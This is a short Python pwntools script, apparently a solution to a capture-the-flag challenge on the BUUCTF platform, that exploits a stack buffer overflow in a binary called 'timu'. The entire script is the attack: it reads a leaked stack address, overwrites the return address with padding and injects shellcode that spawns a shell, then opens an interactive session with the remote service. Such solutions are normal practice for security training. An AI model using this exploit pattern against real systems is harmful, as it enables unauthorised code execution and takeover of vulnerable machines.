from pwn import *

#sh=process("./timu")
sh=remote("node4.buuoj.cn",26488)
context.log_level='debug'

#gdb.attach(sh,'b *0x8048600')

sh.recvuntil('crash: ')
stack=int(sh.recv(10),16)

shellcode=asm(shellcraft.sh())
#payload='crashme\x00'+'aaaaaa'
payload=b'crashme\x00'+b'a'*18+p32(stack-0x1c)+shellcode
sh.sendline(payload)
sh.interactive()
